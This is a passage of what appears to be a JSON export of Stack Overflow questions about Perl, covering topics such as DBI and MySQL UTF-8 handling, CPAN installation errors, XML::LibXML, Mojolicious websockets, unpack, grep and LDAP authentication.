it?</li>\n<li>Most important: How to list all methods their parameters and return values contained in Mojo::DOM ?\nit must be done somehow, because I read that even for perl there are IDE with intelisense (autcompletition) so this IDE must know the methods return value types etc.</li>\n</ul>\n\n<p>Thank you very much</p>\n"},{"tags":["mysql","perl","dbi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12836890,"title":"Cannot insert equivalent plain text of diacritic text in mysql using DBI in perl","body":"<p>I have a column which is primary key for my table, which can have diacritic or normal text.</p>\n\n<p>I have these 2 values:</p>\n\n<pre><code>HÃ¥bo and Habo\n</code></pre>\n\n<p>I want to insert these two column values in my table, but i am getting error:</p>\n\n<pre><code>DBD::mysql::st execute failed: Duplicate entry 'Habo' for key 'PRIMARY'\n</code></pre>\n\n<p>As i check HÃ¥bo is already inserted and it is treating both values same so primary key violation.</p>\n\n<p>My code:</p>\n\n<pre><code>$dbh = DBI-&gt;connect($dsn, $user, $pass)\n            or die \"Unable to connect: $DBI::errstr\\n\";\n$dbh-&gt;{'mysql_enable_utf8'}=1;\n$dbh-&gt;do('SET NAMES utf8');\nmy $sql = sprintf \"INSERT INTO search_term values(%s, %s)\", $dbh-&gt;quote($search_term), \"Data\";\n</code></pre>\n\n<p>My table description</p>\n\n<pre><code>mysql&gt; desc search_term;\n+---------------+--------------+------+-----+---------+-------+\n| Field         | Type         | Null | Key | Default | Extra |\n+---------------+--------------+------+-----+---------+-------+\n| search        | varchar(200) | NO   | PRI | NULL    |       |\n| site          | varchar(500) | NO   |     | NULL    |       |\n+---------------+--------------+------+-----+---------+-------+\n</code></pre>\n\n<p>How can i make MySQL treat both values as different and insert them?\nAny suggestions?</p>\n"},{"tags":["windows","perl","xampp","perl-module","windows-xp-sp3"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":430,"score":0,"question_id":8753460,"title":"Unable To Install Perl Modules Using CPAN (Windows XP Server with XAMPP)","body":"<p>I currently have a Windows XP Pro SP3 server with XAMPP.  I downloaded the Perl add-on for XAMPP earlier today, and it installed without a problem.  After the install, I was able to go to .pl files on my server using a browser and they executed properly.  I am trying to now install some Perl modules using CPAN, and I get a few error messages along the way, and the modules do not install.  I am unfamiliar with Perl and would be grateful for any help.  Below is what happens when I try to install a module:</p>\n\n<pre><code>cpan[4]&gt; install Task::Kensho\nRunning install for module 'Task::Kensho'\nRunning make for A/AP/APEIRON/Task-Kensho-0.31.tar.gz\nCPAN: LWP::UserAgent loaded ok (v5.817)\n\nI would like to connect to one of the following sites to get 'authors/id/A/AP/AP\nEIRON/Task-Kensho-0.31.tar.gz':\n\n http://www.perl.org/CPAN/\n ftp://ftp.perl.org/pub/CPAN/\n\nIs it OK to try to connect to the Internet? [yes] yes\nFetching with LWP:\n  http://www.perl.org/CPAN/authors/id/A/AP/APEIRON/Task-Kensho-0.31.tar.gz\nCPAN: Digest::SHA loaded ok (v5.45)\nFetching with LWP:\n  http://www.perl.org/CPAN/authors/id/A/AP/APEIRON/CHECKSUMS\nChecksum for \\.cpan\\sources\\authors\\id\\A\\AP\\APEIRON\\Task-Kensho-0.31.tar.gz ok\nScanning cache \\.cpan\\build for sizes\n............................................................................DONE\n\nThe system cannot find the path specified.\nUncompressed \\.cpan\\sources\\authors\\id\\A\\AP\\APEIRON\\Task-Kensho-0.31.tar.gz succ\nessfully\nUsing Tar:\"C:\\Programme\\Microsoft Visual Studio .NET 2003\\Vc7\\bin\\tar.EXE\" xvf \"\nTask-Kensho-0.31.tar\":\nThe system cannot find the path specified.\nCouldn't untar Task-Kensho-0.31.tar\nCPAN: File::Temp loaded ok (v0.18)\nPackage seems to come without Makefile.PL.\n  (The test -f \"\\.cpan\\build\\APEIRON-zQFric\\Makefile.PL\" returned false.)\n  Writing one on our own (setting NAME to TaskKensho)\n  Had problems unarchiving. Please build manually\nRunning make test\n  Make had some problems, won't test\nRunning make install\n  Make had some problems, won't install\nFailed during this command:\n APEIRON/Task-Kensho-0.31.tar.gz              : unwrapped NO -- untar failed\n</code></pre>\n\n<p>This particular line:</p>\n\n<pre><code>Using Tar:\"C:\\Programme\\Microsoft Visual Studio .NET 2003\\Vc7\\bin\\tar.EXE\" xvf \"\n</code></pre>\n\n<p>Is referencing a file and directory that I do not have on my system.  I am not sure of the significance of that, but I thought I would point it out.</p>\n\n<p>Any help is greatly appreciated!</p>\n\n<p>Update: @daxim , Thank you for the suggestion.  I installed Strawberry Perl and was able to install all required modules for the script I am trying to run using cpan install [module name].  However, when I go to the script using a web browser, it does not compile and I am getting this in the Apache error log:</p>\n\n<pre><code>[Sun Jan 08 13:03:15 2012] [error] [client 192.168.1.1] Can't load 'C:/strawberry/perl/site/lib/auto/XML/LibXML/LibXML.dll' for module XML::LibXML: load_file:The specified module could not be found at C:/strawberry/perl/lib/DynaLoader.pm line 200.\\r\n[Sun Jan 08 13:03:15 2012] [error] [client 192.168.1.1]  at C:/strawberry/perl/site/lib/XML/LibXML.pm line 154\\r\n[Sun Jan 08 13:03:15 2012] [error] [client 192.168.1.1] BEGIN failed--compilation aborted at C:/strawberry/perl/site/lib/XML/LibXML.pm line 154.\\r\n[Sun Jan 08 13:03:15 2012] [error] [client 192.168.1.1] Compilation failed in require at C:/strawberry/perl/site/lib/XML/LibXML/SAX.pm line 17.\\r\n[Sun Jan 08 13:03:15 2012] [error] [client 192.168.1.1] BEGIN failed--compilation aborted at C:/strawberry/perl/site/lib/XML/LibXML/SAX.pm line 17.\\r\n[Sun Jan 08 13:03:15 2012] [error] [client 192.168.1.1] Compilation failed in require at (eval 27) line 1.\\r\n</code></pre>\n\n<p>I did install XML::LibXML as well as other required modules.  Thanks again for any help!</p>\n"},{"tags":["perl","debugging","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12837295,"title":"Redirecting the debug trace of perl script to a file","body":"<p>Ex:  perl -d:Trace testScript.pl > output.log</p>\n\n<p>Q:1 The traces are not redirected to the output.log file.\nHow to redirect the trace.</p>\n\n<p>Q:2 Is it possible to trace the script only as in the trace it goes into the module too used in the script. Can we trace one or two level only.</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","selenium-rc"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":279,"score":0,"question_id":3093546,"title":"Configuring Selenium RC with Perl","body":"<p>I want to use Selenium RC with a Perl client driver. How can I configure Selenium RC with Perl?</p>\n"},{"tags":["perl","websocket","mojolicious"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12628331,"title":"Access session in Mojolicious websocket","body":"<p>Is there a way to access the <code>session</code> within a websocket request in Mojolicious::Lite, like this?</p>\n\n<pre><code>get '/' =&gt; sub {\n  my $self = shift;\n  $self-&gt;session-&gt;{foo} = 'bar';\n  $self-&gt;render('index');\n};\n\nwebsocket '/ws' =&gt; sub {\n  my $self = shift;\n  $self-&gt;on(message =&gt;\n    sub {\n      my ($self, $msg) = @_;\n      my $foo = $self-&gt;session-&gt;{foo}; # &lt;&lt;&lt;&lt;&lt; is actually empty\n    }\n  );\n};\n</code></pre>\n\n<p>Any hints?</p>\n"},{"tags":["perl","xml-libxml"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":89,"score":2,"question_id":12820049,"title":"Is it possible for XML::LibXML to parse quirky tags?","body":"<p>Is it possible to get <code>XML::LibXML</code> to parse the node shown in the example below? I realize I may be creating invalid XML by specifying a <code>'*'</code> as part of the node name and would appreciate it if someone could explain why it is invalid:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse XML::LibXML;\n\nmy $doc = XML::LibXML-&gt;createDocument;\n\nmy $quirky = XML::LibXML::Element-&gt;new( 'YAK*' );\n$quirky-&gt;appendText( 'Important Data' );\n\n$doc-&gt;setDocumentElement( $quirky );\n\nprint $doc-&gt;toString;  # &lt;?xml version=\"1.0\"?&gt;\n                       # &lt;YAK*&gt;Important Data&lt;/YAK*&gt;\n\nmy $data = XML::LibXML\n           -&gt;new\n             -&gt;parse_string( $doc-&gt;toString );\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;YAK*&gt;Important Data&lt;/YAK*&gt;\n:2: parser error : error parsing attribute name\n&lt;YAK*&gt;Important Data&lt;/YAK*&gt;\n    ^\n:2: parser error : attributes construct error\n&lt;YAK*&gt;Important Data&lt;/YAK*&gt;\n    ^\n:2: parser error : Couldn't find end of Start Tag YAK line 2\n&lt;YAK*&gt;Important Data&lt;/YAK*&gt;\n    ^\n:2: parser error : Extra content at the end of the document\n&lt;YAK*&gt;Important Data&lt;/YAK*&gt;\n    ^\n</code></pre>\n"},{"tags":["php","perl","asterisk","agi"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":98,"score":2,"question_id":12811727,"title":"converting words to numbers in Asterisk dialplan","body":"<p>I Spent the last 3 weeks trying to get this to work. I want to do voice dialing from asterisk using googletts.agi script available on github.  It works but the problem is googletts sometimes return a word instead of a digit in the \"utterance\" variable like 18004633339 may come back as \"180046 tree tree tree nite\" or \"1800 force 6 tree tree 339\" etc.</p>\n\n<p><a href=\"https://github.com/zaf/asterisk-googletts\" rel=\"nofollow\">https://github.com/zaf/asterisk-googletts</a>\nhttps://github.com/zaf/asterisk-speech-recog</p>\n\n<p>The link below has a script That converts words to numbers </p>\n\n<p><a href=\"http://www.karlrixon.co.uk/writing/convert-numbers-to-words-with-php\" rel=\"nofollow\">http://www.karlrixon.co.uk/writing/convert-numbers-to-words-with-php</a></p>\n\n<p><strong>This is my dialplan</strong></p>\n\n<pre><code>exten =&gt; 2255,1,Answer()\nexten =&gt; 2255,n,Wait(1)\n;exten =&gt; 2255,n,flite(\"Say the number you wish to call. Then press the pound key.\")\nexten =&gt; 2255,n,Espeak(\"Say the number you wish to call. Then press the pound key.\")\nexten =&gt; 2255,n(record),agi(speech-recog.agi,en-US)\nexten =&gt; 2255,n,Noop(= Script returned: ${status} , ${id} , ${confidence},            ${utterance} =)\nexten =&gt; 2256,6,Set(NUM2CALL=${utterance})\n</code></pre>\n\n<p><strong>NEED CODE FOR HERE that would take ${utterance} or NUM2CALL variable and fix it if there are words in  it to a proper number which asterisk can dial</strong></p>\n\n<pre><code>exten =&gt; 2255,n,SayDigits(\"${NUM2CALL2}\")\nexten =&gt; 2255,n,Background(vm-star-cancel)\nexten =&gt; 2255,n,Background(vm-tocallnum)\nexten =&gt; 2255,n,Read(PROCEED,beep,1)                                        \nexten =&gt; 2255,n,GotoIf($[\"foo${PROCEED}\" = \"foo1\"]?15:16)\nexten =&gt; 2255,15,Goto(outbound-allroutes,${NUM2CALL2},1)\nexten =&gt; 2255,16,hangup\n</code></pre>\n\n<p>I am thinking if I can add to the dictionary array I will eventually have a very accurate voice dialer.  I spent 4 days testing tropo ASR it is very accurate for single digits but with multiple digit accuracy falls away fast. Thanks in advance for any assistance. I will post the completed script as a project on github. I tried with pocketphinx also with the  TIDIGITS grammar and model but that was even worse than the pocketsphinx default dictionary which was giving a similar problem.</p>\n"},{"tags":["perl","rrdtool","rrd"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":4783,"score":3,"question_id":328682,"title":"How can I update data with RRDtool?","body":"<p>I am using RRDtool for storing data for displaying graphs. I update the RRD by  RRDs::update and this fails when trying to rewrite the information, means update data for a time in the past (e.g. someone moved the system timer back). The error I get is: </p>\n\n<pre><code>ERROR: Cannot update /opt/dashboard/rrd/Disk/192.168.120.168_disk_1.rrd with \n'1228032301:24:24' illegal attempt to update using time 1228032301 when last \nupdate time is 1228050001 (minimum one second step)\n</code></pre>\n\n<p>I want to always allow the rewrite, how can I do this?</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12834184,"title":"Convert xml to idml","body":"<p>I want convert to idml from xml</p>\n\n<p>XML File:</p>\n\n<pre><code>&lt;XLSE&gt;\n&lt;table&gt;\n&lt;tgroup&gt;\n&lt;thead&gt;\n&lt;tr&gt;\n&lt;td&gt;Sampe&lt;/td&gt;\n&lt;td&gt;Sampe&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/thead&gt;\n&lt;tbody&gt;\n&lt;tr&gt;\n&lt;td&gt;Sampe&lt;/td&gt;\n&lt;td&gt;Sampe&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/tbody&gt;\n&lt;tfoot&gt;\n&lt;tr&gt;\n&lt;td&gt;Sampe&lt;/td&gt;\n&lt;td&gt;Sampe&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/tfoot&gt;\n&lt;/tgroup&gt;\n&lt;/table&gt;\n&lt;/XLSE&gt;\n</code></pre>\n\n<p>I import in indesign this file, i got xml struture in idml, </p>\n\n<ol>\n<li>how to get table format in story file without change in xml structure</li>\n<li>how will get same input tag during xml file export in indesign</li>\n</ol>\n\n<p>please give with sample </p>\n"},{"tags":["mysql","perl","utf-8"],"answer_count":6,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":1436,"score":3,"question_id":4680722,"title":"Perl UTF8 CGI and DBI ... what's the correct workflow?","body":"<p>I am having the pleasure of rebuilding a perl based web framework to UTF8 support. I took the following steps  </p>\n\n<p>for the main script:<br>\n<code>use open IO =&gt; \":utf8\",\":std\";</code><br>\n<code>use utf8;</code>  </p>\n\n<p>for the DBI Adapter:<br>\n<code>$self-&gt;{dbh}-&gt;{'mysql_enable_utf8'} = 1;'</code>  </p>\n\n<p>and in my request parser for POST and GET, based on CGI:<br>\n<code>foreach (@val) { $_ = decode(\"UTF-8\",$_); }</code>  </p>\n\n<p>This, as far as I can tell, works just fine on my local Ubuntu with Perl 5.10.1, but on the webserver which runs 5.10, decoding POST or GET will mess up the text. </p>\n\n<p>I must admit, I am very confused by the whole UTF8 thing.   I need to<br>\nRead Templates<br>\nGet data from mySQL<br>\nProcess POST and GET \ninsert into mySQL<br>\nwrite Templates  </p>\n\n<p>Is there anything I'm forgetting here? What could cause the inconstant behaviour? Does every module I use in the main script need to specifically <code>use utf8</code> or is it enough if the main script does that?  </p>\n\n<p>Thanks for any hints,<br>\nthomas</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":61,"score":4,"question_id":12832318,"title":"Why does my unpack print the wrong values?","body":"<p>Why do I get the wrong answers/values?</p>\n\n<p>The correct values it should print are <code>1, 2175, 4</code> but instead I always get <code>1, 3, 0</code> ?!</p>\n\n<pre><code>my $data = pack ('C*', map hex, split /\\s+/, \"01 00 00 00 7F 08 03 00 21 04 80 04 FF D7 FB 0C EC 01 44 00 61 1D 00 00 10 3B 00 00 FF D7 FB 0C 00 00 8C 64 00 00 EC 45\");\n\n($obj-&gt;{Version}, $obj-&gt;{res1}, $obj-&gt;{EARFCN}, $tmp1, $obj-&gt;{res2}, $tmp2)=unpack(\"C C3 v C C V\", $data);\n\n$obj-&gt;{band} = ($tmp1 &amp; 0xfc) &gt;&gt; 2;\nprint \"\\n\".$obj-&gt;{Version};    # Should print 1\nprint \"\\n\".$obj-&gt;{EARFCN};   # Should print 2175\nprint \"\\n\".$obj-&gt;{band};      # Should print 4. Note: this is the first 6 bits from MSB of $tmp1.\nprint \"\\n\";\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":166,"score":5,"question_id":12833363,"title":"meaning of a regexp if ($_ =~ /-\\n/)","body":"<p>I am a beginner of perl scripting.\nI know hyphen (-)  is used to specify the range.</p>\n\n<p>But what if it is mentioned in the beginning of the expression?</p>\n\n<p>Example:</p>\n\n<pre><code>if ($_ =~ /-\\n/)\n//do something\n</code></pre>\n\n<p>How to interpret the above code?</p>\n\n<p>\"if the parameter is equal to a range of newline\" ?\n(No, that is weird understanding :-/)</p>\n\n<p>Please help.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12823676,"title":"How can I identify source code from binary data without using -T/-B?","body":"<p>I want to use binmode on binary files in Perl. So how can I know the file at hand is binary or text?</p>\n\n<p>That means first I'd read full file to know if it is in binary or text then rewind the FP with binmode set if it is binary.</p>\n\n<p>Since Perl -B/-T checks only a beginning block of text, it usually classifies pdf as text file(the source code could be hiding in any extension like .gif,.pdf etc). So I'd  need to read full file data to decide if it is binary or text file.</p>\n\n<p>I've heard that any source code file( .pl,.c,.php etc) will not contain invisible characters like 0x0-0x1f and 0xff onwards.</p>\n\n<p>Can I check every byte to be in this range to declare whether or not it is a source code file?</p>\n"},{"tags":["xml","perl","stylesheet","xml-libxml"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":12745373,"title":"Adding to a given XML the XSLT stylesheet declaration with perl + LibXML","body":"<p>Premise: I come from C++ and I'm pretty noob at Perl.\nI'm trying to add a stylesheet declaration to a given <code>.xml</code> file. The <code>.xml</code> file is created by a third part and downloaded aside; we are not questioning correctness nor well-formedness of the XML. We also can't know if the XML in the file is indented or in one-row.</p>\n\n<p>Not being able to manipulate the file neatly only with Perl, I took XML::LibXML but I'm still stuck. This is so far what I've done.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse XML::LibXML;\n\nmy $path = './file.xml';\n\nmy $fxml = XML::LibXML::Document-&gt;new('1.0','utf-8');\nmy $pi = $fxml-&gt;createPI(\"xml-stylesheet\");\n$pi-&gt;setData(type=&gt;'text/xsl', href=&gt;'trasf.xsl');\n$fxml-&gt;appendChild($pi);\n\n$XML::LibXML::skipXMLDeclaration = 1;\nmy $docwodecl = XML::LibXML::Document-&gt;new;\n$docwodecl = $doc-&gt;toString;\n\nopen my $out_fh, '&gt;', $path;\nprint {$out_fh} $final_xml.$docwodecl;\nclose $out_fh;\n</code></pre>\n\n<p>With this I only get the XML without the initial declaration <code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;</code> and the utf-8 characters are all messed up.\nI've tried to use something like this</p>\n\n<pre><code>$fxml-&gt;setDocumentElement($doc);\n$fxml-&gt;toFile($path);\n</code></pre>\n\n<p>but it doesn't work.\nThere's some method i could use to accomplish my (after all pretty simple) goal? I've looked in the <a href=\"http://search.cpan.org/~shlomif/XML-LibXML-2.0004/lib/XML/LibXML/Document.pod\" rel=\"nofollow\">docs</a> but I can't find anything useful.</p>\n\n<p><h3>EDIT</h3> The stylesheet declaration have to be after the <code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;</code> and before the actual XML.</p>\n"},{"tags":["perl","authentication","active-directory","microsoft","ldap"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1034,"score":1,"question_id":3141074,"title":"LDAP Active directory authentication question","body":"<p>I am trying to authenticate users on my site with their LDAP credentials. However the bind to the active directory seems to require my credentials first before I can authenticate any other username/passwords. <br>\nI don't want to hardcode my credentials in the application. Any suggestions?</p>\n\n<pre><code>$self-&gt;authen-&gt;config( \nDRIVER =&gt; [ 'Authen::Simple::LDAP',\nhost   =&gt; 'ldapad.company.com',\nbasedn =&gt; 'OU=XXX,OU=AD,DC=YYY,DC=ZZZ', \nbinddn =&gt; 'CN=myname,OU=Users,OU=company,OU=AD,DC=company,DC=ZZZ',\nbindpw =&gt; 'secret',\nfilter =&gt; '(cn=%s)',   \n\n],\n\nCREDENTIALS          =&gt; [ 'authen_username', 'authen_password' ],\nSTORE                =&gt; 'Session',\nLOGOUT_RUNMODE       =&gt; 'logout',\nLOGIN_RUNMODE        =&gt; 'login',\nPOST_LOGIN_RUNMODE   =&gt; 'okay',\nRENDER_LOGIN         =&gt; \\&amp;my_login_form,\n</code></pre>\n\n<p>);</p>\n"},{"tags":["perl","mplayer"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12830717,"title":"Perl and open3. What am I missing?","body":"<p>I'm trying to make a script that communicates with mplayer using open3, but the mplayer process is showing up as defunct and I am unable to send standard input into mplayer.</p>\n\n<p>Here's the code:</p>\n\n<pre><code>#!/usr/bin/env perl\n\n{\n    package mplayer::test;\n    use IPC::Open3;\n\n    sub new {\n        my $class = shift;\n        my $self = bless { @_ }, $class;\n        $self-&gt;start_mplayer();\n        $self;\n    }\n\n    sub start_mplayer{\n        my $self = shift;\n        local *DEVNULL;\n        open DEVNULL, \"&gt;/dev/null\" or die \"/dev/null: $!\";\n        open OUTPUT, \"&gt;out.log\" or die \"out.log: $!\";\n        $self-&gt;{r} = local *MPLAYER_READ;\n        $self-&gt;{w} = local *MPLAYER_WRITE;\n        $self-&gt;{pid} = open3($self-&gt;{w},$self-&gt;{r},\"&gt;&amp;DEVNULL\",'mplayer -slave -idle -v');\n        die \"Error opening mplayer!\\n\" unless $self-&gt;{pid};\n    }\n    sub do{\n        my ($self, $command) = @_;\n        print {$self-&gt;{w}} $command, \"\\n\";\n    }\n}\n\nmplayer::test-&gt;new;\n\nmplayer::test-&gt;do(qq~loadfile test.mp3~);\nsleep(5);\n</code></pre>\n\n<p>I must be missing something obvious, I'm learning open3 from examples from other modules.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":57,"score":-2,"question_id":12832671,"title":"Convert word to pdf using perl","body":"<p>I want to convert word to pdf by using perl script. Is it possible using perl script. If possible means which module is used. Please give some example links.</p>\n"},{"tags":["regex","perl","shell","unix","grep"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":141,"score":3,"question_id":12831417,"title":"How to match once per file in grep?","body":"<p>Is there any grep option that let's me control total number of matches but stops at first match on each file?</p>\n\n<p>Example:</p>\n\n<p>If I do this <code>grep -ri --include '*.coffee' 're' .</code> I get this:</p>\n\n<pre><code>./app.coffee:express = require 'express'\n./app.coffee:passport = require 'passport'\n./app.coffee:BrowserIDStrategy = require('passport-browserid').Strategy\n./app.coffee:app = express()\n./config.coffee:    session_secret: 'nyan cat'\n</code></pre>\n\n<p>And if I do <code>grep -ri -m2 --include '*.coffee' 're' .</code>, I get this:</p>\n\n<pre><code>./app.coffee:config = require './config'\n./app.coffee:passport = require 'passport'\n</code></pre>\n\n<p>But, what I really want is this output:</p>\n\n<pre><code>./app.coffee:express = require 'express'\n./config.coffee:    session_secret: 'nyan cat'\n</code></pre>\n\n<p>Doing <code>-m1</code> does not work as I get this for <code>grep -ri -m1 --include '*.coffee' 're' .</code></p>\n\n<pre><code>./app.coffee:express = require 'express'\n</code></pre>\n\n<p>Tried not using grep e.g. this <code>find . -name '*.coffee' -exec awk '/re/ {print;exit}' {} \\;</code> produced:</p>\n\n<pre><code>config = require './config'\n    session_secret: 'nyan cat'\n</code></pre>\n\n<p>UPDATE: As noted below the GNU grep <code>-m</code> option treats counts per file whereas <code>-m</code> for BSD grep treats   it as global match count</p>\n"},{"tags":["mysql","perl","dbi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12832335,"title":"Perl DBI MySQL Updates","body":"<p>I am wondering how you can print the results from the following Perl code snippet:</p>\n\n<pre><code>    $sth = $dbh-&gt;prepare(\"SELECT * FROM table_name\");\n    $sth-&gt;execute();\n</code></pre>\n\n<p>I'd like to see what you would see if you typed \"SELECT * FROM table_name; into mySQL and had the entire relation show up. Is there a return value from $sth that can be looped over and printed out?</p>\n"},{"tags":["perl","converter"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":81,"score":4,"question_id":12822374,"title":"Converting base10 to base36 in perl","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/2670869/whats-the-best-way-to-do-base36-arithmetic-in-perl\">Whatâs the best way to do base36 arithmetic in Perl?</a>  </p>\n</blockquote>\n\n\n\n<p>Hello is it possible to convert numbers from a base-10-to-base-36-conversion with perl script?</p>\n\n<p>here's an example :</p>\n\n<pre><code>base 10 - 1234567890123 and outcome\nbase 36 - FR5HUGNF\n</code></pre>\n"},{"tags":["eclipse","perl","debugging","activeperl","epic"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":135,"score":0,"question_id":11289747,"title":"Perl EPIC Debugger in Eclipse Timing Out","body":"<p>I'm trying to use the EPIC debugger in Eclipse and it keeps timing out.  I'm running Windows 7, Eclipse 3.72, EPIC 0.5.46, Padwalker 1.94, and ActivePerl (64bit) 5.14.2.  I notice the last message before timeout is \"launching delegate\" and then the timeout dialog comes up.  I used it several weeks ago and it worked fine, and I don't see any updates to any software on my machine that would interact (e.g. java).  Is there something that expires in ActivePerl after 30 days?  Below is the output of the console.  I've checked my firewall and that's not the issue.  I've searched extensively and can't find an answer - thanks!</p>\n\n<pre><code>Unable to connect to remote host: 192.168.1.79:5000\nCompilation failed in require.\n at C:/Users/sedwards/Documents/Eclipse Workspace/Doug/bid_calc.pl line 0\n    main::BEGIN() called at C:/Users/sedwards/Documents/Eclipse Workspace/Doug/bid_calc.pl line 0\n    eval {...} called at C:/Users/sedwards/Documents/Eclipse Workspace/Doug/bid_calc.pl line 0\nBEGIN failed--compilation aborted.\n at C:/Users/sedwards/Documents/Eclipse Workspace/Doug/bid_calc.pl line 0\n</code></pre>\n"},{"tags":["perl","loops","split"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":12822072,"title":"How do I replace row identifiers with sequential numbers?","body":"<p>I have written a perl script that splits 3 columns into scalars and replaces various values in the second column using regex. This part works fine, as shown below. What I would like to do, though, is change the first column ($item_id into a series of sequential numbers that restart when the original (numeric) value of $item_id changes.</p>\n\n<p>For example:\n123<br>\n123<br>\n123<br>\n123<br>\n2397<br>\n2397<br>\n2397<br>\n2397<br>\n8693<br>\n8693<br>\n8693<br>\n8693   </p>\n\n<p>would be changed to something like this (in a column):</p>\n\n<p>1\n2\n3\n4\n1\n2\n3\n4\n1\n2\n3\n4</p>\n\n<p>This could either replace the first column or be a new fourth column.\nI understand that I might do this through a series of if-else statements and tried this, but that doesn't seem to play well with the while procedure I've already got working for me. - Thanks, Thom Shepard</p>\n\n<pre><code>open(DATA,\"&lt; text_to_be_processed.txt\");\nwhile (&lt;DATA&gt;)\n{\nchomp;\nmy ($item_id,$callnum,$data)=split(/\\|/);\n$callnum=~s/110/\\%I/g;\n$callnum=~s/245/\\%T/g;\n$callnum=~s/260/\\%U/g;\nprint \"$item_id\\t$callnum\\t$data\\n\";\n}   #End while\nclose DATA;\n</code></pre>\n"},{"tags":["perl","numbers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12831019,"title":"replace small numbers in Perl","body":"<p>In a text file, I have many lines looking like <code>(a,b,c)</code> where a, b, and c are double precision real numbers, for instance <code>(8.27605704077856,0.505526531790625,1.15577754382534e-05)</code>. Is there a simple way to replace numbers smaller than 10e-4 by 0 in Perl?</p>\n\n<p><strong>Edit:</strong> For instance, the text file to be treated looks like:</p>\n\n<pre><code>\\plotinstruction[color,style,width]\npoints{\n(8.27,0.5,1.1e-05)\n(8.26,1,4.1e-06)\n(8.25,1.5,3e-06)\n}\n</code></pre>\n\n<p>and I want to write in a new file:</p>\n\n<pre><code>\\plotinstruction[color,style,width]\npoints{\n(8.27,0.5,0)\n(8.26,1,0)\n(8.25,1.5,0)\n}\n</code></pre>\n"},{"tags":["perl","permutation","combinations"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12822595,"title":"Practical Perl solution to permutate through list for unique combinations","body":"<p>Apologies if this looks like another problem - there are quite a lot of solutions and I didn't find what I'm looking for, but I may well have missed it. Also apologies if title isn't best description - not sure how else to word it. </p>\n\n<p>I have five 'features' as strings, e.g.:</p>\n\n<pre><code>$height $width $depth $length $colour\n</code></pre>\n\n<p>I want to get all the different <strong><em>unique</em></strong> combinations starting with 5 and going down to 1 e.g.:</p>\n\n<pre><code>5: $height $width $depth $length $colour\n4: $height $width $depth $length \n4: $height $width $depth $colour\n4: $height $width $length $colour\n4: $height $depth $length $colour\n4: $width $depth $length $colour\n...\nand so on \n...\n1: $height \n1: $width \n1: $depth \n1: $length \n1: $colour\n</code></pre>\n\n<p>I don't know if it makes a difference, but in code I plan to use <code>&amp;&amp;</code> and <code>!$string</code>, e.g.:</p>\n\n<pre><code>4: $height &amp;&amp; $width &amp;&amp; $depth &amp;&amp; $length &amp;&amp; !$colour \n4: $height &amp;&amp; $width &amp;&amp; $depth &amp;&amp; !$length &amp;&amp; $colour\n4: $height &amp;&amp; $width &amp;&amp; !$depth &amp;&amp; $length &amp;&amp; $colour\n4: $height &amp;&amp; !$width &amp;&amp; $depth &amp;&amp; $length &amp;&amp; $colour\n4: !$height &amp;&amp; $width &amp;&amp; $depth &amp;&amp; $length &amp;&amp; $colour\nand so on.\n</code></pre>\n\n<p>I was fine doing this by hand when I had 4 features, but with 5 it's too much! \nI thought putting the variables in a hash would may be good starting point, but as for the actual algorithm... Any help appreciated!</p>\n\n<p>Edit: just realised it may not be clear, but I want to be able to 'query' each combination as they will be in if/elsif statements, so <code>if (h &amp;&amp; w &amp;&amp; !d ...)</code> </p>\n"},{"tags":["perl"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":486,"score":3,"question_id":1666799,"title":"Truth Table Generation for the given input","body":"<p>I want to generate a truth table for the given input.Suppose if i give input 2 the output will be 